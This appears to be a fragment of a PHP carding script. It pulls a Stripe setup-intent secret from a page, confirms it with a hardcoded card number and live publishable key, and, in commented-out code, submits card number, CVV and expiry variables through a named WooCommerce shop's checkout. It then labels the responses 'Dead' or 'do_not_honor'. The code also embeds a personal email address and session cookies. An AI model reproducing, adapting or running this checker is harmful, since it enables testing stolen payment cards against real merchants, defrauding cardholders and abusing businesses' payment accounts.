...
preg_match('/type="setupIntent" data-secret="([^"]+)"/', $response1, $match);
$secret = $match[1];
 $id = Getstr($secret,'seti_','_secret');
echo $id;

###################################################
$url = "https://api.stripe.com/v1/setup_intents/seti_'.$id.''/confirm";
$data = array(
    "payment_method_data[type]" => "card",
    "payment_method_data[billing_details][name]" => "stev+santa",
    "payment_method_data[card][number]" => "5314620051558588",
    "payment_method_data[card][cvc]" => "111",
    "payment_method_data[card][exp_month]" => "01",
    "payment_method_data[card][exp_year]" => "25",
    "payment_method_data[guid]" => "353000bc-2f46-42e2-adb1-cefb7719c350adb3ea",
    "payment_method_data[muid]" => "8d3d6373-e737-4398-975f-94b3f9e234443fa09c",
    "payment_method_data[sid]" => "965ee444-ed1f-4849-8d80-ab78dbe46a78fa0467",
    "payment_method_data[pasted_fields]" => "number",
    "payment_method_data[payment_user_agent]" => "stripe.js/056868f56; stripe-js-v3/056868f56",
    "payment_method_data[time_on_page]" => "49551",
    "expected_payment_method_type" => "card",
    "use_stripe_sdk" => "true",
    "key" => "pk_live_3o0n45H4gBqzxcctY7JKbNLC",
...
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=smith+smith&billing_details[email]=yadavsahil1836%40Gmail.com&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=123+Allen+Street&billing_details[address][line2]=&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&billing_details[phone]=&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F1104f1bb4%3B+stripe-js-v3%2F1104f1bb4&time_on_page=73623&key=pk_live_51MPzwYLCHn7x9btYsBYs6Yu4IdHAHfIxRp7cJYTuypeMImE2trDJbtoyKz2lbT2o0koFV6iESnfp20Lxrr2coXcD00LkiEqIVO');
...
//         $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://instantlegit.com/?wc-ajax=checkout');
//         curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//         curl_setopt($ch, CURLOPT_HEADER, 0);
//         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//                'authority: instantlegit.com',
//                'method: POST',
...
//                'accept-language: en-US,en;q=0.9',
//                'content-type: application/x-www-form-urlencoded',
//                 'cookie: wmc_current_currency=USD; woocommerce_items_in_cart=1; wp_woocommerce_session_2093430738f0ab4d905e03929013a27e=t_218f7ab14bbf68ec40676adee26e0b%7C%7C1675928064%7C%7C1675924464%7C%7C5e41cb007124be51fcd8debf9fe3cfaa; woocommerce_cart_hash=f55bc8b66a075dde21af057d1836f112; mabel-rpnlite-last=39018; mabel-rpnlite-time=7',
//                'origin: https://instantlegit.com',
//                'referer: https://instantlegit.com/checkout-2/',
//                'sec-fetch-dest: empty',
//                'sec-fetch-mode: cors',
//                'sec-fetch-site: same-origin',
//                'sec-gpc: 1',
...
//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=smith&billing_last_name=smith&billing_company=&billing_country=US&billing_address_1=123+Allen+Street&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10080&billing_phone=&billing_email=yadavsahil1836%40Gmail.com&wcal_guest_capture_nonce=85b1a29328&_wp_http_referer=%2Fcheckout-2%2F&order_comments=&payment_method=mecom_stripe&terms=on&terms-field=1&woocommerce-process-checkout-nonce=cab4548bc1&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&mecom-stripe-payment-method-id='.$id.'');
...
elseif(strpos($r2, "We cannot process your payment right now, please try another payment method" )) {
  $status = 'Dead❌';
  $cc_code = '『 do_not_honor 』';
  $reqfind = '2 Req';
}
